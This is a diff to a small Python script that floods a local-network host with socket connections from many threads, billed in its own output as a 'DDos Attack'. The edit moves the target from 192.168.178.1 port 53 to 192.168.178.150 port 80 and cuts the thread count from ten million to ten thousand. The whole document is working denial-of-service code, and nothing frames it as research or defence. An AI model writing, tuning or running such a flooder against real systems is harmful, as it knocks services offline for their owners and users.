@@ -1,9 +1,9 @@
 import socket
 from threading import Thread
 
-host = "192.168.178.1"
+host = "192.168.178.150"
 ip = socket.gethostbyname(host)
-port = 53
+port = 80
 
 def dos():
     while True:
@@ -19,6 +19,6 @@ def dos():
         mysocket.close()
 
 print("===== Start DDos Attack =====")
-for i in range(10000000):
+for i in range(10000):
     t = Thread(target=dos)
     t.start()
